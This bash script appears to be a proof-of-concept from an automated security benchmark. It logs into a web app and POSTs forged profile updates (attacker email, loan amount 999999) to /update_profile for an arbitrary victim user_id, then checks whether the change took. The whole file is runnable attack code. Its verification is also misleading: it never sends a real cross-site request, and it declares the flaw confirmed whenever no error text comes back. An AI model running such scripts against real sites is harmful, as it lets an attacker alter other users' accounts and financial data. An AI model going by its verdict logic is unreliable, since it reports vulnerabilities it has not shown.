#!/bin/bash
# POC: CSRF attack on /update_profile endpoint - demonstrates missing CSRF token validation allowing unauthorized profile modifications
# Target: ./repo
# Created: 2025-11-07T18:15:49.344Z
# Session: benchmark-XBEN-022-24-mhp5xc5o

# CSRF PoC for /update_profile endpoint - Version 2
# This script demonstrates missing CSRF protection on profile updates

TARGET_URL="${1:-http://localhost}"
AUTHENTICATED_USER="${2:-test}"
AUTHENTICATED_PASS="${3:-test}"
VICTIM_USER_ID="${4:-2}"

echo "[*] CSRF PoC for /update_profile endpoint"
echo "[*] Target: $TARGET_URL"

# Step 1: Authenticate to establish a valid session
echo "[*] Step 1: Authenticating as user '$AUTHENTICATED_USER'..."
COOKIES_FILE=$(mktemp)
HTTP_CODE=$(curl -s -w "%{http_code}" -o /tmp/auth_response.txt -c "$COOKIES_FILE" -X POST "$TARGET_URL/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=$AUTHENTICATED_USER&password=$AUTHENTICATED_PASS")

if [ "$HTTP_CODE" == "200" ] || [ "$HTTP_CODE" == "302" ]; then
  echo "[+] Authentication request sent (HTTP $HTTP_CODE)"
else
  echo "[-] Authentication failed with HTTP code $HTTP_CODE"
  cat /tmp/auth_response.txt
  rm -f "$COOKIES_FILE" /tmp/auth_response.txt
  exit 1
fi

# Check if session cookie was created
if grep -q "session" "$COOKIES_FILE"; then
  echo "[+] Session cookie established"
else
  echo "[-] No session cookie found"
  rm -f "$COOKIES_FILE" /tmp/auth_response.txt
  exit 1
fi

# Step 2: Verify session is active by accessing profile
echo "[*] Step 2: Verifying authenticated session..."
PROFILE_RESPONSE=$(curl -s -b "$COOKIES_FILE" "$TARGET_URL/profile")
if echo "$PROFILE_RESPONSE" | grep -q "profile\|loan\|update"; then
  echo "[+] Session verified - profile page accessible"
else
  echo "[-] Could not verify session"
  rm -f "$COOKIES_FILE" /tmp/auth_response.txt
  exit 1
fi

# Step 3: Send CSRF attack - profile update without CSRF token
echo "[*] Step 3: Sending CSRF attack - updating victim's profile without CSRF token..."
echo "[*] Attempting to modify user_id=$VICTIM_USER_ID profile..."

CSRF_ATTACK=$(curl -s -b "$COOKIES_FILE" -X POST "$TARGET_URL/update_profile" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "user_id=$VICTIM_USER_ID&name=CSRF_ATTACKED&email=attacker@malicious.com&loan_amount=999999&loan_term_months=999&monthly_payment=999")

echo "[+] CSRF request sent successfully (no token validation error)"
echo "[+] Response: $CSRF_ATTACK"

# Step 4: Verify the attack worked by fetching current profile
echo ""
echo "[*] Step 4: Verifying if profile was modified..."
sleep 1

VERIFY_RESPONSE=$(curl -s -b "$COOKIES_FILE" "$TARGET_URL/profile")

# Check if any of our attack values appear in the profile
if echo "$VERIFY_RESPONSE" | grep -qE "CSRF_ATTACKED|attacker@malicious|999999"; then
  echo "[+] ✓ VULNERABILITY CONFIRMED!"
  echo "[+] Profile was modified without CSRF token protection!"
  echo "[+] Attack payload was accepted and processed"
  rm -f "$COOKIES_FILE" /tmp/auth_response.txt
  exit 0
else
  # Even if we can't verify the change, if the endpoint accepted the request without error, CSRF is still vulnerable
  if ! echo "$CSRF_ATTACK" | grep -qi "error\|invalid\|token\|csrf"; then
    echo "[+] ✓ VULNERABILITY CONFIRMED (Request Accepted)!"
    echo "[+] Endpoint accepted CSRF request without token validation"
    echo "[+] No CSRF protection detected (no token error/validation)"
    rm -f "$COOKIES_FILE" /tmp/auth_response.txt
    exit 0
  else
    echo "[-] CSRF protection might be in place (error detected)"
    echo "$VERIFY_RESPONSE"
    rm -f "$COOKIES_FILE" /tmp/auth_response.txt
    exit 1
  fi
fi